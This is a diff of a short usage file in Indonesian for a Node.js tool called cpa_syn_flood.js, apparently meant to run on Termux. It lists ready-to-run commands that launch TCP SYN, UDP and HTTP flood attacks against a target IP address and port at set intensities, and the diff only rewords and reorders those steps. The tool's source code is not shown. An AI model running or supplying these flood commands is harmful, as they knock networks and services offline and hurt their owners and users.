@@ -1,19 +1,16 @@
 BISMILLAHIRRAHMANIRRAHIM 
 
-# 1. Install Node.js jika belum
-# Untuk Termux:
+# Install Node.js 
 pkg install nodejs
 
-# 2. Simpan file cpa_syn_flood.js
+# Tampilkan bantuan
+node cpa_syn_flood.js --help
 
-# 3. Jalankan
+# TCP SYN Flood
 node cpa_syn_flood.js 192.168.1.100 80 100 tcp
 
-# Atau dengan metode UDP
+# UDP Flood
 node cpa_syn_flood.js 192.168.1.100 53 50 udp
 
-# Atau HTTP flood
+# HTTP Flood
 node cpa_syn_flood.js 192.168.1.100 8080 200 http
-
-# Lihat bantuan
-node cpa_syn_flood.js --help
